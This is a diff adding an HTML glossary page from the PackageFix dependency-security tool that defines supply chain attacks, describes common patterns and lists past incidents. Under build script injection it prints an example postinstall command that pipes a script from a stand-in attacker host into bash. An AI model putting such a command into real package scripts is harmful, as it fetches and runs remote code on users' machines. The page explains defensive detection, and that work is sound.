@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Supply Chain Attack — Definition | PackageFix Glossary</title>
+<meta name="description" content="When an attacker compromises software you use rather than software you write. A supply chain attack targets the tools, libraries, and services your code depends on rather than yo...">
+<link rel="canonical" href="https://packagefix.dev/glossary/supply-chain-attack">
+<meta property="og:title" content="Supply Chain Attack — Definition | PackageFix Glossary">
+<meta property="og:description" content="When an attacker compromises software you use rather than software you write. A supply chain attack targets the tools, libraries, and services your code depends on rather than yo...">
+<meta property="og:url" content="https://packagefix.dev/glossary/supply-chain-attack">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<link rel="icon" type="image/svg+xml" href="/icon.svg">
+<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "DefinedTerm",
+      "name": "Supply Chain Attack",
+      "description": "A supply chain attack targets the tools, libraries, and services your code depends on rather than your code itself. Instead of breaking into your application directly, attackers compromise a dependency you trust \u2014 then everyone who installs that dependency gets the malicious code automatically.",
+      "url": "https://packagefix.dev/glossary/supply-chain-attack",
+      "inDefinedTermSet": {
+        "@type": "DefinedTermSet",
+        "name": "PackageFix Dependency Security Glossary",
+        "url": "https://packagefix.dev/glossary"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "PackageFix",
+          "item": "https://packagefix.dev"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Glossary",
+          "item": "https://packagefix.dev/glossary"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Supply Chain Attack",
+          "item": "https://packagefix.dev/glossary/supply-chain-attack"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "How is a supply chain attack different from a regular vulnerability?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "A regular vulnerability is a bug in code \u2014 it exists but hasn't been exploited yet. A supply chain attack is an active, intentional attack \u2014 someone deliberately puts malicious code into a package that developers trust and install."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Does npm audit catch supply chain attacks?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No. npm audit only checks for known CVEs in the vulnerability database. It doesn't detect malicious code added to a package, compromised maintainer accounts, or typosquatting. Those require behavioral analysis and supply chain-specific detection."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What does PackageFix check for supply chain attacks?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "PackageFix checks for: Unicode/invisible characters in scripts (Glassworm), packages dormant for 12+ months that suddenly updated (zombie packages), package names one character from popular packages (typosquatting), curl/wget in postinstall scripts (build script injection), and packages flagged on the CISA KEV catalog."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Can I completely prevent supply chain attacks?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "No \u2014 but you can significantly reduce your exposure. Keep dependencies updated, use lockfiles, pin specific versions in CI, and scan manifests regularly with tools like PackageFix."
+          }
+        }
+      ]
+    }
+  ]
+}</script>
+<style>
+:root {
+  --bg:#0B0D14; --surface:#12151F; --surface2:#1A1D2E;
+  --border:#252836; --purple:#6C63FF; --green:#22C55E;
+  --orange:#F97316; --red:#EF4444; --yellow:#EAB308;
+  --text:#E2E4F0; --muted:#6B7280;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;min-height:100vh}
+a{color:var(--purple);text-decoration:none}
+a:hover{text-decoration:underline}
+.site-header{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:15px;font-weight:700;color:var(--text)}
+.logo span{color:var(--purple)}
+.nav-links{display:flex;gap:20px;font-size:12px}
+.nav-links a{color:var(--muted)}
+.nav-links a:hover{color:var(--text);text-decoration:none}
+.container{max-width:860px;margin:0 auto;padding:48px 24px}
+.breadcrumb{font-size:11px;color:var(--muted);margin-bottom:24px;display:flex;gap:6px;flex-wrap:wrap}
+.breadcrumb a{color:var(--muted)}
+.definition-box{background:var(--surface);border:1px solid var(--purple);border-left:4px solid var(--purple);border-radius:8px;padding:20px 24px;margin:0 0 32px}
+.definition-box .def-label{font-size:10px;font-weight:700;color:var(--purple);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
+.definition-box p{color:var(--text);font-size:13px;line-height:1.7;margin:0}
+h1{font-size:clamp(18px,3vw,28px);font-weight:700;margin-bottom:16px;line-height:1.3}
+h2{font-size:15px;font-weight:600;margin:36px 0 12px}
+h3{font-size:13px;font-weight:600;margin:20px 0 8px}
+p{color:var(--muted);margin-bottom:12px;font-size:12px;line-height:1.7}
+.lead{color:var(--text);font-size:13px;margin-bottom:0;line-height:1.7}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:11px;line-height:1.6;margin:12px 0;white-space:pre-wrap}
+code{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-size:11px}
+.example-box{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:8px;padding:16px 20px;margin:20px 0}
+.example-box .label{font-size:10px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
+.fix-box{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.2);border-left:3px solid var(--green);border-radius:8px;padding:16px 20px;margin:20px 0}
+.fix-box .label{font-size:10px;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
+.cta-box{background:var(--surface);border:1px solid var(--purple);border-radius:10px;padding:24px;margin:32px 0;text-align:center}
+.cta-box p{color:var(--text);font-size:13px;margin-bottom:16px}
+.cta-btn{display:inline-block;background:var(--purple);color:#fff;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 28px;border-radius:7px;text-decoration:none}
+.cta-btn:hover{opacity:.9;text-decoration:none}
+.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
+.badge-purple{background:rgba(108,99,255,.2);color:var(--purple);border:1px solid var(--purple)}
+.badge-red{background:rgba(239,68,68,.2);color:var(--red);border:1px solid var(--red)}
+.badge-orange{background:rgba(249,115,22,.2);color:var(--orange);border:1px solid var(--orange)}
+.faq{margin:40px 0}
+.faq-item{border-bottom:1px solid var(--border);padding:16px 0}
+.faq-item:last-child{border-bottom:none}
+.faq-q{font-size:12px;font-weight:600;color:var(--text);margin-bottom:8px}
+.faq-a{font-size:12px;color:var(--muted);line-height:1.7}
+.related-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:12px}
+.related-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.related-card a{color:var(--text);font-size:12px;font-weight:500}
+.related-card p{font-size:11px;color:var(--muted);margin:4px 0 0}
+.glossary-index{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px;margin-top:16px}
+.glossary-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.glossary-card a{color:var(--text);font-size:12px;font-weight:500}
+.glossary-card p{font-size:11px;color:var(--muted);margin:4px 0 0;line-height:1.5}
+.site-footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-size:11px;color:var(--muted);margin-top:60px}
+.site-footer a{color:var(--muted)}
+@media(max-width:640px){.nav-links{display:none}.related-grid{grid-template-columns:1fr}.glossary-index{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <a href="https://packagefix.dev" class="logo">Package<span>Fix</span></a>
+  <nav class="nav-links">
+    <a href="https://packagefix.dev">Tool</a>
+    <a href="https://packagefix.dev/glossary">Glossary</a>
+    <a href="https://packagefix.dev/blog">Blog</a>
+    <a href="https://packagefix.dev/cisa-kev">CISA KEV</a>
+    <a href="https://github.com/metriclogic26/packagefix">GitHub</a>
+  </nav>
+</header>
+<main class="container">
+  <div class="breadcrumb"><a href="/">PackageFix</a> <span style='color:var(--border)'>/</span> <a href="/glossary">Glossary</a> <span style='color:var(--border)'>/</span> <span style="color:var(--text)">Supply Chain Attack</span></div>
+  
+<h1>Supply Chain Attack</h1>
+<div style="margin-bottom:24px"><span class="badge badge-purple">All ecosystems</span></div>
+
+<div class="definition-box">
+  <div class="def-label">Definition</div>
+  <p class="lead">A supply chain attack targets the tools, libraries, and services your code depends on rather than your code itself. Instead of breaking into your application directly, attackers compromise a dependency you trust — then everyone who installs that dependency gets the malicious code automatically.</p>
+</div>
+
+
+<h2>Why it's hard to defend against</h2>
+<p>When you write <code>npm install express</code>, you're trusting Express and every package Express depends on. A modern Node.js application might have 500-1000 transitive dependencies — packages you've never heard of, maintained by people you've never met. An attacker only needs to compromise one of them.</p>
+<p>The attack is particularly effective because the malicious code arrives through your normal build process. It looks identical to a legitimate dependency update. By the time anyone notices, the code has been running in production for days or weeks.</p>
+
+<h2>Common attack patterns</h2>
+<h3>Compromised maintainer account</h3>
+<p>An attacker gains access to a package maintainer's npm or PyPI account and publishes a malicious version. The package's download count and reputation stay intact — only the code changes. The event-stream incident (2018) and dozens of others since have used this pattern.</p>
+
+<h3>Typosquatting</h3>
+<p>Register a package with a name one typo away from a popular package. <code>expres</code> instead of <code>express</code>. Wait for developers to mistype and install the malicious version.</p>
+
+<h3>Dependency confusion</h3>
+<p>If your company uses private packages with certain names, an attacker can register those same names on the public registry. Some package managers will fetch the public version instead of the private one.</p>
+
+<h3>Build script injection</h3>
+<p>Add <code>curl https://attacker.com/payload.sh | bash</code> to a package's postinstall script. Runs automatically when anyone installs the package.</p>
+
+<h2>Real examples that hit production</h2>
+<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
+  <li><strong>event-stream (2018)</strong> — malicious code targeting a Bitcoin wallet, reached millions of installs</li>
+  <li><strong>ua-parser-js (2021)</strong> — compromised to install cryptomining malware</li>
+  <li><strong>colors and faker (2022)</strong> — maintainer deliberately broke packages affecting thousands of projects</li>
+  <li><strong>Contagious Interview (2024-2026)</strong> — North Korean operation using fake npm packages to target developers</li>
+</ul>
+
+<div class="cta-box">
+  <p>Check your dependencies for CVEs, CISA KEV entries, and supply chain risks.</p>
+  <a href="https://packagefix.dev" class="cta-btn">Open PackageFix →</a>
+  <p style="margin-top:12px;font-size:11px;color:var(--muted)">Free · No signup · No CLI · Runs in your browser</p>
+</div>
+<div class="faq"><h2>Common questions</h2><div class="faq-item"><div class="faq-q">How is a supply chain attack different from a regular vulnerability?</div><div class="faq-a">A regular vulnerability is a bug in code — it exists but hasn't been exploited yet. A supply chain attack is an active, intentional attack — someone deliberately puts malicious code into a package that developers trust and install.</div></div><div class="faq-item"><div class="faq-q">Does npm audit catch supply chain attacks?</div><div class="faq-a">No. npm audit only checks for known CVEs in the vulnerability database. It doesn't detect malicious code added to a package, compromised maintainer accounts, or typosquatting. Those require behavioral analysis and supply chain-specific detection.</div></div><div class="faq-item"><div class="faq-q">What does PackageFix check for supply chain attacks?</div><div class="faq-a">PackageFix checks for: Unicode/invisible characters in scripts (Glassworm), packages dormant for 12+ months that suddenly updated (zombie packages), package names one character from popular packages (typosquatting), curl/wget in postinstall scripts (build script injection), and packages flagged on the CISA KEV catalog.</div></div><div class="faq-item"><div class="faq-q">Can I completely prevent supply chain attacks?</div><div class="faq-a">No — but you can significantly reduce your exposure. Keep dependencies updated, use lockfiles, pin specific versions in CI, and scan manifests regularly with tools like PackageFix.</div></div></div>
+<div style="margin:40px 0"><h2>Related guides</h2><div class="related-grid"><div class="related-card"><a href="/blog/supply-chain-attacks-package-json">5 Supply Chain Attacks npm Misses</a><p>Attack patterns with detection methods</p></div><div class="related-card"><a href="/glossary/dependency-confusion">Dependency Confusion</a><p>Private package name attack</p></div><div class="related-card"><a href="/glossary/typosquatting">Typosquatting</a><p>One character off</p></div><div class="related-card"><a href="/cisa-kev">CISA KEV Packages</a><p>Actively exploited right now</p></div></div></div>
+
+</main>
+<footer class="site-footer">
+  <p>PackageFix · <a href="https://packagefix.dev">packagefix.dev</a> · MIT Licensed · Open Source</p>
+  <p style="margin-top:6px">Part of the MetricLogic network ·
+  <a href="https://configclarity.dev">ConfigClarity</a> ·
+  <a href="https://domainpreflight.dev">DomainPreflight</a></p>
+  <p style="margin-top:6px">Vulnerability data: <a href="https://osv.dev">OSV Database</a> · <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></p>
+</footer>
+</body>
+</html>
